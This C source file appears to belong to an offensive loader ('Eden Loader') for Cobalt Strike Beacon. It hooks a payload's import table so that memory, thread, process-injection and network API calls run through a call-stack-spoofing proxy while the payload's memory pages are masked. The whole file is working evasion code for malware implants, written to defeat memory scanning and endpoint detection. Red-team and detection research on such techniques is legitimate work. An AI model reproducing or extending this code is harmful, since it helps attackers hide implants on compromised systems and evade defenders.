#include "guardexec.h"

extern void MaskVisiblePages();
extern void UnmaskVisiblePages();
extern void GuardExecCleanup();
extern PROXY gProxyCall;

/*
* Callgate wrapper which will proxy target function call through Draugr PIC stub.
*/
ULONG_PTR Callgate(PVOID targetFunction, int numOfArgs, ...){
    FUNCTION_CALL functionCall = { 0 };
    IMPORTFUNCS funcs = { 0 };

    /* To avoid recursion give a clean copy of IMPORTFUNCS */
    funcs.LoadLibraryA = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;
    funcs.GetModuleHandleA = GetModuleHandleA;

    /* Parse incoming args */
    va_list args;
    va_start(args, numOfArgs);
    for (int i = 0; i < numOfArgs; i++) {
        functionCall.args[i] = va_arg(args, ULONG_PTR);
        dprintf("EDEN LOADER: Callgate Arg %d -> %p\n", i, functionCall.args[i]);
    }
    va_end(args);

    /* Set other required info */
    functionCall.functionPtr = targetFunction;
    functionCall.bMask = FALSE;
    functionCall.numOfArgs = numOfArgs;

    /* Rock and/or roll */
    gProxyCall(&funcs, &functionCall);
    dprintf("EDEN LOADER: Callgate retValue -> %p\n", functionCall.retValue);
    return functionCall.retValue;
}

/*
* This is where our IAT hooks live.
*/
HMODULE WINAPI _LoadLibraryA(LPCSTR lpLibFileName){
    dprintf("EDEN LOADER: LoadLibrary\n");
    dprintf("EDEN LOADER: Target Library: %s\n", lpLibFileName);
    HMODULE hModule = NULL;
    MaskVisiblePages();
    hModule = (HMODULE)Callgate(LoadLibraryA, 1, lpLibFileName);
    UnmaskVisiblePages();
    return hModule;
}

LPVOID WINAPI _VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect){
    dprintf("EDEN LOADER: VirtualAlloc\n");
    LPVOID pBuffer = NULL;
    MaskVisiblePages();
    pBuffer = (LPVOID)Callgate(KERNEL32$VirtualAlloc, 4, lpAddress, dwSize, flAllocationType, flProtect);
    UnmaskVisiblePages();
    return pBuffer;
}

LPVOID WINAPI _VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect){
    dprintf("EDEN LOADER: VirtualAllocEx\n");
    LPVOID pBuffer = NULL;
    MaskVisiblePages();
    pBuffer = (LPVOID)Callgate(KERNEL32$VirtualAllocEx, 5, hProcess, lpAddress, dwSize, flAllocationType, flProtect);
    UnmaskVisiblePages();
    return pBuffer;
}

BOOL WINAPI _VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect){
    dprintf("EDEN LOADER: VirtualProtect\n");
    BOOL bSuccess = FALSE;
    MaskVisiblePages();
    bSuccess = (BOOL)Callgate(KERNEL32$VirtualProtect, 4, lpAddress, dwSize, flNewProtect, lpflOldProtect);
    UnmaskVisiblePages();
    return bSuccess;
}

BOOL WINAPI _VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect){
    dprintf("EDEN LOADER: VirtualProtectEx\n");
    BOOL bSuccess = FALSE;
    MaskVisiblePages();
    bSuccess = (BOOL)Callgate(KERNEL32$VirtualProtectEx, 5, hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
    UnmaskVisiblePages();
    return bSuccess;
}

BOOL WINAPI _VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType){
    dprintf("EDEN LOADER: VirtualFree\n");
    BOOL bSuccess = FALSE;
    MaskVisiblePages();
    bSuccess = (BOOL)Callgate(KERNEL32$VirtualFree, 3, lpAddress, dwSize, dwFreeType);
    UnmaskVisiblePages();
    return bSuccess;
}

BOOL WINAPI _GetThreadContext(HANDLE hThread, CONTEXT * lpContext){
    dprintf("EDEN LOADER: GetThreadContext\n");
    BOOL bSuccess = FALSE;
    MaskVisiblePages();
    bSuccess = (BOOL)Callgate(KERNEL32$GetThreadContext, 2, hThread, lpContext);
    UnmaskVisiblePages();
    return bSuccess;
}

BOOL WINAPI _SetThreadContext(HANDLE hThread, CONTEXT * lpContext){
    dprintf("EDEN LOADER: SetThreadContext\n");
    BOOL bSuccess = FALSE;
    MaskVisiblePages();
    bSuccess = (BOOL)Callgate(KERNEL32$SetThreadContext, 2, hThread, lpContext);
    UnmaskVisiblePages();
    return bSuccess;
}

DWORD WINAPI _ResumeThread(HANDLE hThread){
    dprintf("EDEN LOADER: ResumeThread\n");
    DWORD dwSuspendCount = 0;
    MaskVisiblePages();
    dwSuspendCount = (DWORD)Callgate(KERNEL32$ResumeThread, 1, hThread);
    UnmaskVisiblePages();
    return dwSuspendCount;
}

HANDLE WINAPI _CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId){
    dprintf("EDEN LOADER: CreateThread\n");
    HANDLE hThread = NULL;
    MaskVisiblePages();
    hThread = (HANDLE)Callgate(KERNEL32$CreateThread, 6, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
    UnmaskVisiblePages();
    return hThread;
}

HANDLE WINAPI _CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId){
    dprintf("EDEN LOADER: CreateRemoteThread\n");
    HANDLE hThread = NULL;
    MaskVisiblePages();
    hThread = (HANDLE)Callgate(KERNEL32$CreateRemoteThread, 7, hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
    UnmaskVisiblePages();
    return hThread;
}

HANDLE WINAPI _OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId){
    dprintf("EDEN LOADER: OpenProcess\n");
    HANDLE hProcess = NULL;
    MaskVisiblePages();
    hProcess = (HANDLE)Callgate(KERNEL32$OpenProcess, 3, dwDesiredAccess, bInheritHandle, dwProcessId);
    UnmaskVisiblePages();
    return hProcess;
}

HANDLE WINAPI _OpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId){
    dprintf("EDEN LOADER: OpenThread\n");
    HANDLE hThread = NULL;
    MaskVisiblePages();
    hThread = (HANDLE)Callgate(KERNEL32$OpenThread, 3, dwDesiredAccess, bInheritHandle, dwProcessId);
    UnmaskVisiblePages();
    return hThread;
}

BOOL WINAPI _CloseHandle(HANDLE hObject){
    dprintf("EDEN LOADER: CloseHandle\n");
    BOOL bSuccess = FALSE;
    MaskVisiblePages();
    bSuccess = (BOOL)Callgate(KERNEL32$CloseHandle, 1, hObject);
    UnmaskVisiblePages();
    return bSuccess;
}

HANDLE WINAPI _CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName){
    dprintf("EDEN LOADER: CreateFileMappingA\n");
    HANDLE hFileMapping = NULL;
    MaskVisiblePages();
    hFileMapping = (HANDLE)Callgate(KERNEL32$CreateFileMappingA, 6, hFile, lpFileMappingAttributes, flProtect, dwMaximumSizeHigh, dwMaximumSizeLow, lpName);
    UnmaskVisiblePages();
    return hFileMapping;
}

LPVOID WINAPI _MapViewOfFile(HANDLE hFileMappingObject, DWORD  dwDesiredAccess, DWORD  dwFileOffsetHigh, DWORD  dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap){
    dprintf("EDEN LOADER: MapViewOfFile\n");
    LPVOID pBuffer = NULL;
    MaskVisiblePages();
    pBuffer = (LPVOID)Callgate(KERNEL32$MapViewOfFile, 5, hFileMappingObject, dwDesiredAccess, dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap);
    UnmaskVisiblePages();
    return pBuffer;
}

BOOL WINAPI _UnmapViewOfFile(LPCVOID lpBaseAddress){
    dprintf("EDEN LOADER: UnMapViewOfFile\n");
    BOOL bSuccess = FALSE;
    MaskVisiblePages();
    bSuccess = (BOOL)Callgate(KERNEL32$UnmapViewOfFile, 1, lpBaseAddress);
    UnmaskVisiblePages();
    return bSuccess;
}

SIZE_T WINAPI _VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength){
    dprintf("EDEN LOADER: VirtualQuery\n");
    SIZE_T bytesReturned = 0;
    MaskVisiblePages();
    bytesReturned = (SIZE_T)Callgate(KERNEL32$VirtualQuery, 3, lpAddress, lpBuffer, dwLength);
    UnmaskVisiblePages();
    return bytesReturned;
}

BOOL WINAPI _DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions){
    dprintf("EDEN LOADER: DuplicateHandle\n");
    BOOL bSuccess = FALSE;
    MaskVisiblePages();
    bSuccess = (BOOL)Callgate(KERNEL32$DuplicateHandle, 7, hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions);
    UnmaskVisiblePages();
    return bSuccess;
}

BOOL WINAPI _ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead){
    dprintf("EDEN LOADER: ReadProcessMemory\n");
    BOOL bSuccess = FALSE;
    MaskVisiblePages();
    bSuccess = (BOOL)Callgate(KERNEL32$ReadProcessMemory, 5, hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
    UnmaskVisiblePages();
    return bSuccess;
}

BOOL WINAPI _WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten){
    dprintf("EDEN LOADER: WriteProcessMemory\n");
    BOOL bSuccess = FALSE;
    MaskVisiblePages();
    bSuccess = (BOOL)Callgate(KERNEL32$WriteProcessMemory, 5, hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
    UnmaskVisiblePages();
    return bSuccess;
}

BOOL WINAPI _CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation){
    dprintf("EDEN LOADER: CreateProcessA\n");
    BOOL bSuccess = FALSE;
    MaskVisiblePages();
    bSuccess = (BOOL)Callgate(KERNEL32$CreateProcessA, 10, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
    UnmaskVisiblePages();
    return bSuccess;
}

void WINAPI _Sleep(DWORD dwMilliseconds){
    dprintf("EDEN LOADER: Sleep\n");
    MaskVisiblePages();
    (void)Callgate(KERNEL32$Sleep, 1, dwMilliseconds);
    UnmaskVisiblePages();
}

DWORD WINAPI _WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds){
    dprintf("EDEN LOADER: WaitForSingleObject\n");
    DWORD dwWaitResult = 0;

    /* Try first with zero time out and don't bother masking if object is signalled immediately */
    dwWaitResult = (DWORD)Callgate(KERNEL32$WaitForSingleObject, 2, hHandle, 0);
    if (WAIT_OBJECT_0 != dwWaitResult){
        MaskVisiblePages();
        dwWaitResult = (DWORD)Callgate(KERNEL32$WaitForSingleObject, 2, hHandle, dwMilliseconds);
        UnmaskVisiblePages();
    }
    return dwWaitResult;
}
/* On thread exit, free guardexec allocs */
void WINAPI _ExitThread(DWORD dwExitCode){
    dprintf("EDEN LOADER: ExitThread\n");

    /* Clean up guardexec allocations */
    GuardExecCleanup();

    /* Exiting thread... */
    KERNEL32$ExitThread(dwExitCode);
}

HINTERNET WINAPI _InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext) {
    dprintf("EDEN LOADER: InternetConnectA\n");
    HINTERNET hConnect = NULL;
    /* NB Masking here can break things as args are in Beacon's heap/data section (this is not an issue via BeaconGate) */
    hConnect = (HINTERNET)Callgate(WININET$InternetConnectA, 8, hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
    return hConnect;
}

/* Main IAT hook logic */
char * WINAPI _GetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    char * result = (char *)GetProcAddress(hModule, lpProcName);

    if ((char *)GetProcAddress == result) {
        return (char *)_GetProcAddress;
    }
    /* I like this method of identifying hook targets, because there are no strings to fuss with. BUT,
     * beware... LIBRARY$func WILL LoadLibrary the specified library, here USER32.dll when the PICO is
     * loaded into memory. So, if that's not desireable, you may need to switch to using string hashes or
     * something else to decide what to hook */
    else if ((char *)LoadLibraryA == result) {
        return (char *)_LoadLibraryA;
    }
    else if ((char *)KERNEL32$VirtualAlloc == result) {
        return (char *)_VirtualAlloc;
    }
    else if ((char *)KERNEL32$VirtualAllocEx == result) {
        return (char *)_VirtualAllocEx;
    }
    else if ((char *)KERNEL32$VirtualProtect == result) {
        return (char *)_VirtualProtect;
    }
    else if ((char *)KERNEL32$VirtualProtectEx == result) {
        return (char *)_VirtualProtectEx;
    }
    else if ((char *)KERNEL32$VirtualFree == result) {
        return (char *)_VirtualFree;
    }
    else if ((char *)KERNEL32$GetThreadContext == result) {
        return (char *)_GetThreadContext;
    }
    else if ((char *)KERNEL32$SetThreadContext == result) {
        return (char *)_SetThreadContext;
    }
    else if ((char *)KERNEL32$ResumeThread == result) {
        return (char *)_ResumeThread;
    }
    else if ((char *)KERNEL32$CreateThread == result) {
        return (char *)_CreateThread;
    }
    else if ((char *)KERNEL32$CreateRemoteThread == result) {
        return (char *)_CreateRemoteThread;
    }
    else if ((char *)KERNEL32$OpenProcess == result) {
        return (char *)_OpenProcess;
    }
    else if ((char *)KERNEL32$OpenThread == result) {
        return (char *)_OpenThread;
    }
    else if ((char *)KERNEL32$CloseHandle == result) {
        return (char *)_CloseHandle;
    }
    else if ((char *)KERNEL32$CreateFileMappingA == result) {
        return (char *)_CreateFileMappingA;
    }
    else if ((char *)KERNEL32$MapViewOfFile == result) {
        return (char *)_MapViewOfFile;
    }
    else if ((char *)KERNEL32$UnmapViewOfFile == result) {
        return (char *)_UnmapViewOfFile;
    }
    else if ((char *)KERNEL32$VirtualQuery == result) {
        return (char *)_VirtualQuery;
    }
    else if ((char *)KERNEL32$DuplicateHandle == result) {
        return (char *)_DuplicateHandle;
    }
    else if ((char *)KERNEL32$ReadProcessMemory == result) {
        return (char *)_ReadProcessMemory;
    }
    else if ((char *)KERNEL32$WriteProcessMemory == result) {
        return (char *)_WriteProcessMemory;
    }
    else if ((char *)KERNEL32$CreateProcessA == result) {
        return (char *)_CreateProcessA;
    }
    else if ((char *)KERNEL32$Sleep == result) {
        return (char *)_Sleep;
    }
    else if ((char *)KERNEL32$WaitForSingleObject == result) {
        return (char *)_WaitForSingleObject;
    }
    else if ((char *)KERNEL32$ExitThread == result) {
        return (char *)_ExitThread;
    }
    else if ((char *)WININET$InternetConnectA == result) {
        return (char *)_InternetConnectA;
    }
    return result;
}
